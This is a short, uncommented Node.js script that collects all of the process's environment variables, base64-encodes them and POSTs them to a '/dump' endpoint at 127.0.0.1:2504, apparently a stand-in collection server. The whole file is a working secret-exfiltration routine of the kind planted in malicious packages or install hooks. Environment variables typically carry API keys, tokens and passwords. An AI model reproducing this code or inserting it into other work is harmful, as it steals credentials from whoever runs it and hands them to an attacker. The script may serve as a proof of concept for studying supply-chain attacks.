var http = require('http');
var querystring = require('querystring');

var envData = JSON.stringify(process.env);
var envBase = new Buffer(envData).toString('base64');
var payload = querystring.stringify({envBase});

var options = {
	host: '127.0.0.1',
	port: 2504,
	path: '/dump',
	method: "POST",
	headers: {
		"Content-Type": "application/x-www-form-urlencoded",
		"Content-Length": Buffer.byteLength(payload)
	}
}

var req = http.request(options, (res) => {
	console.log(`STATUS => ${res.statusCode}`);
	console.log('The response is as follow => ');
	res.setEncoding('utf-8');
	res.on('data', (info) => { console.log(`Info from server is ${info}`); });
	res.on('end', () => { console.log('The response stream is closed now!'); });
});

req.on('error', (e) => {
	console.log(`The request was interrupted due to ${e}.`);
});
req.write(payload);
req.end();

